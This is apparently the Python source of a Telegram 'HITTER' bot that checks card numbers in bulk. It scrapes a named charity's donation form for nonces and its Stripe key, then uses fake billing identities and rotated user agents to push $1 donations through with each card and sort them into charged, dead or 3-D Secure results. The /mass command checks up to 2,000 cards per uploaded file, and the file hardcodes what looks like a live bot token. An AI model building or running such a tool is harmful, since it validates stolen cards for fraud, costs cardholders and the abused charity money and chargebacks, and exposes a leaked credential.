import telebot
import requests
import re
import random
import time
import uuid
import os
import json
from faker import Faker
from bs4 import BeautifulSoup

# Replace with your actual Telegram Bot Token
API_TOKEN = '8075455874:AAGxl7ELCNce4BJtvMn8pDqb2TPr6oPPBrk'

bot = telebot.TeleBot(API_TOKEN)
fake = Faker()

# Modern User Agents for rotation
MODERN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
]

def get_ids():
    return str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())

def get_form_data(session, ua):
    """Obtain tokens and form data dynamically from the site."""
    try:
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        }
        r = session.get("https://ccfoundationorg.com/donate/", headers=headers, timeout=15)
        if r.status_code != 200: return None
        
        html = r.text
        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form', id='charitable-donation-form')
        
        if not form: return None
        
        data = {}
        for input_tag in form.find_all('input', type='hidden'):
            name = input_tag.get('name')
            if name:
                data[name] = input_tag.get('value')
        
        # Extract Stripe Key
        stripe_vars_match = re.search(r'var CHARITABLE_STRIPE_VARS = (\{.*?\});', html)
        if stripe_vars_match:
            stripe_vars = json.loads(stripe_vars_match.group(1))
            data['pk'] = stripe_vars.get('key')
        else:
            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
            if pk_match:
                data['pk'] = pk_match.group(0)
        
        required = ['charitable_form_id', '_charitable_donation_nonce', 'campaign_id', 'pk']
        if not all(k in data for k in required): return None
        
        return data
    except Exception as e:
        print(f"Error fetching form data: {e}")
        return None

def create_pm(session, ua, pk, cc, mm, yy, cvc):
    """Create a Stripe payment method."""
    guid, muid, sid = get_ids()
    fn, ln = fake.first_name(), fake.last_name()
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': ua,
    }
    
    data = {
        'type': 'card',
        'billing_details[name]': f'{fn} {ln}',
        'billing_details[email]': f"{fn.lower()}.{ln.lower()}{random.randint(100, 999)}@gmail.com",
        'billing_details[address][line1]': fake.street_address(),
        'billing_details[address][postal_code]': fake.zipcode(),
        'card[number]': cc,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/33c734767c; stripe-js-v3/33c734767c; card-element',
        'referrer': 'https://ccfoundationorg.com',
        'time_on_page': str(random.randint(5000, 15000)),
        'key': pk,
    }
    
    try:
        r = session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=15)
        res = r.json()
        if r.status_code == 200: return res.get('id'), None
        err = res.get('error', {})
        return None, err.get('message') or err.get('code') or 'Unknown Stripe Error'
    except Exception as e: return None, str(e)

def pay(session, ua, form_data, pm):
    """Execute the donation/payment."""
    fn, ln = fake.first_name(), fake.last_name()
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://ccfoundationorg.com',
        'referer': 'https://ccfoundationorg.com/donate/',
        'user-agent': ua,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    payload = {
        'charitable_form_id': form_data['charitable_form_id'],
        form_data['charitable_form_id']: '',
        '_charitable_donation_nonce': form_data['_charitable_donation_nonce'],
        '_wp_http_referer': '/donate/',
        'campaign_id': form_data['campaign_id'],
        'description': form_data.get('description', 'Donation'),
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'recurring_donation': 'once',
        'title': random.choice(['Mr', 'Mrs', 'Ms']), 
        'first_name': fn,
        'last_name': ln,
        'email': f"{fn.lower()}.{ln.lower()}{random.randint(10,99)}@gmail.com",
        'address': fake.street_address(), 
        'postcode': fake.zipcode(), 
        'city': fake.city(),
        'country': 'GB',
        'gateway': 'stripe',
        'stripe_payment_method': pm,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }
    
    try:
        r = session.post("https://ccfoundationorg.com/wp-admin/admin-ajax.php", headers=headers, data=payload, timeout=20)
        try:
            res_json = r.json()
        except:
            return False, f"Invalid JSON Response: {r.status_code}"
        
        # Extract client_secret for hit detection
        client_secret = res_json.get('stripe_client_secret') or res_json.get('data', {}).get('stripe_client_secret') or res_json.get('stripe_payment_intent_client_secret')
        
        if not client_secret:
            # Check if it succeeded directly or failed early
            if res_json.get('success'):
                return True, "CHARGED ✅ [THANK YOU FOR SUPPORTING CC FOUNDATION - SUCCESS]"
            errors = res_json.get('errors') or res_json.get('data', {}).get('errors')
            if isinstance(errors, list) and len(errors) > 0:
                error_msg = errors[0]
            else:
                error_msg = res_json.get('data', {}).get('error', 'Unknown Error')
            
            # Formatting site-level declines
            if "declined" in error_msg.lower():
                return False, f"GENERIC DECLINE ❌ {error_msg}"
            elif "insufficient" in error_msg.lower():
                return False, f"INSUFFICIENT FUNDS ❌ {error_msg}"
            return False, error_msg

        # Proper hit detection via Stripe Confirm
        pi_id = client_secret.split('_secret_')[0]
        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        
        confirm_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua,
        }
        
        confirm_data = {
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'key': form_data['pk'],
            'client_secret': client_secret,
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
        }
        
        r_confirm = session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=20)
        confirm_res = r_confirm.json()
        
        # Save response for debugging/extraction simulation if needed
        with open('response.txt', 'w') as f:
            f.write(json.dumps(confirm_res, indent=4))
        
        if 'error' in confirm_res:
            err = confirm_res['error']
            decline_code = err.get('decline_code', err.get('code', 'unknown'))
            message = err.get('message', 'Your card was declined.')
            
            # Map Stripe decline codes to user requested format
            if decline_code == 'insufficient_funds':
                resp = f"INSUFFICIENT FUNDS ❌ {message}"
            elif decline_code in ['card_not_supported', 'authentication_required', 'card_error_authentication_required']:
                resp = f"3D SECURE REQUIRED ⚠️ {message}"
            elif decline_code == 'generic_decline':
                resp = f"GENERIC DECLINE ❌ {message}"
            else:
                resp = f"{decline_code.upper().replace('_', ' ')} ❌ {message}"
                
            return False, resp
        
        status = confirm_res.get('status')
        if status in ['succeeded', 'requires_capture']:
            return True, "CHARGED ✅ [THANK YOU FOR SUPPORTING CC FOUNDATION - SUCCESS]"
        elif status == 'requires_action':
            return True, "3D SECURE / AUTHENTICATION REQUIRED (HIT) ✅ [THANK YOU - SUCCESS]"
        else:
            return True, f"HIT ✅ ({status}) [THANK YOU - SUCCESS]"

    except Exception as e:
        return None, f"Error: {str(e)}"

def check_single_card(card_str):
    """Main logic for checking a single card with retries."""
    parts = re.split(r'[|:/]', card_str.strip())
    if len(parts) < 4:
        return False, "Invalid Format", card_str

    cc, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4: yy = yy[2:]
    card_info = f"{cc}|{mm}|{yy}|{cvc}"
    
    max_retries = 1
    for attempt in range(max_retries):
        session = requests.Session()
        ua = random.choice(MODERN_UAS)
        
        form_data = get_form_data(session, ua)
        if not form_data:
            if attempt < max_retries - 1: continue
            return None, "Site Down/Blocked", card_info

        pm, err = create_pm(session, ua, form_data['pk'], cc, mm, yy, cvc)
        if not pm:
            if any(x in str(err).lower() for x in ['decline', 'invalid', 'expired', 'cvc']):
                return False, f"DEAD ❌ {err}", card_info
            if attempt < max_retries - 1: continue
            return None, f"ERROR ⛔️ {err}", card_info

        success, result_msg = pay(session, ua, form_data, pm)
        
        if success is True:
            return True, result_msg, card_info
        elif success is False:
            return False, result_msg, card_info
        else:
            if attempt < max_retries - 1: continue
            return None, result_msg, card_info
            
    return None, "Max Retries Reached", card_info

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "꒰ ✅ ꒱   𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗  —  𝗛𝗜𝗧𝗧𝗘𝗥\n\n"
        "꒰ 💰 ꒱   𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽 𝗔𝗰𝘁𝗶𝘃𝗲  ⤵\n"
        "   ▸   status   ·  𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ✓\n"
        "   ▸   access   ·  𝗔𝗹𝗹 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝘂𝗻𝗹𝗼𝗰𝗸𝗲𝗱\n\n"
        "꒰ ⚡️ ꒱   𝗚𝗲𝘁 𝗦𝘁𝗮𝗿𝘁𝗲𝗱  ⤵\n\n"
        "   ▸   /𝗰𝗵𝗸     ·  𝗦𝗶𝗻𝗴𝗹𝗲 𝗰𝗵𝗲𝗰𝗸\n"
        "       /m𝗮𝘀𝘀  .  𝗠𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸\n\n"
        "   ❤️  𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗛𝗜𝗧𝗧𝗘𝗥  ⭐️"
    )
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['chk'])
def chk_handler(message):
    start_time = time.time()
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx")
        return

    card_str = args[1]
    proc_msg = bot.reply_to(message, "🔍 Checking...")
    
    success, result_msg, card_info = check_single_card(card_str)
    
    status_label = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅" if success is True else ("𝗗𝗲𝗮𝗱 ❌" if success is False else "𝗘𝗿𝗿𝗼𝗿 ⛔️")
    
    resp_text = (
        f"꒰ {status_label} ꒱  —  𝗦𝘁𝗿𝗶𝗽𝗲\n\n"
        "꒰ 💰 ꒱  𝗖𝗮𝗿𝗱\n"
        f"   ▸  num  · {card_info}\n"
        "   ▸  gate · 𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
        f"   ▸  resp · {result_msg}\n\n"
        f"🔄  {time.time() - start_time:.2f}s"
    )
    bot.edit_message_text(resp_text, chat_id=message.chat.id, message_id=proc_msg.message_id)

@bot.message_handler(commands=['mass'])
def mass_handler(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "Please reply to a .txt file.")
        return

    start_time = time.time()
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8')
    except:
        content = downloaded_file.decode('latin-1')
        
    cards = re.findall(r'\d{15,16}[|:/]\d{1,2}[|:/]\d{2,4}[|:/]\d{3,4}', content)
    if not cards:
        bot.reply_to(message, "No valid cards found.")
        return

    cards = cards[:2000]
    total_cards = len(cards)
    charged_count, dead_count, error_count = 0, 0, 0
    
    summary_msg = bot.reply_to(message, "꒰ ⚡️ ꒱   𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦  —  𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...")
    
    def update_summary(status_label="𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴..."):
        elapsed = time.time() - start_time
        total_checked = charged_count + dead_count + error_count
        hit_rate = (charged_count / total_checked * 100) if total_checked > 0 else 0
        text = (
            f"꒰ ⚡️ ꒱   𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦  —  {status_label}\n\n"
            "꒰ 🔄 ꒱   𝗦𝘂𝗺𝗺𝗮𝗿𝘆  ⤵\n"
            f"   ▸   𝗰𝗮𝗿𝗱𝘀    · {total_checked}/{total_cards}\n"
            f"   ▸   𝗲𝗹𝗮𝗽𝘀𝗲𝗱  · {int(elapsed)}s\n"
            f"   ▸   𝗵𝗶𝘁 𝗿𝗮𝘁𝗲 · {hit_rate:.1f}%\n\n"
            "꒰ 📰 ꒱   𝗛𝗶𝘁 𝗖𝗼𝘂𝗻𝘁  ⤵\n"
            f"   ▸   💰 𝗖𝗵𝗮𝗿𝗴𝗲𝗱  · {charged_count}\n"
            f"   ▸   ❌ 𝗗𝗘𝗔𝗗     · {dead_count}\n"
            f"   ▸   ⛔️ 𝗘𝗿𝗿𝗼𝗿    · {error_count}"
        )
        try: bot.edit_message_text(text, chat_id=message.chat.id, message_id=summary_msg.message_id)
        except: pass

    for card_str in cards:
        success, result_msg, card_info = check_single_card(card_str)
        
        if success is True:
            charged_count += 1
            hit_text = (
                "꒰ ✅ ꒱   𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  —  𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗔𝗦𝗦\n\n"
                "꒰ 💰 ꒱  𝗖𝗮𝗿𝗱\n"
                f"   ▸  num  · {card_info}\n"
                "   ▸  gate · 𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
                f"   ▸  resp · {result_msg}\n"
            )
            bot.send_message(message.chat.id, hit_text)
        elif success is False:
            dead_count += 1
        else:
            error_count += 1
        
        if (charged_count + dead_count + error_count) % 10 == 0:
            update_summary()
    
    update_summary("𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲")

if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()
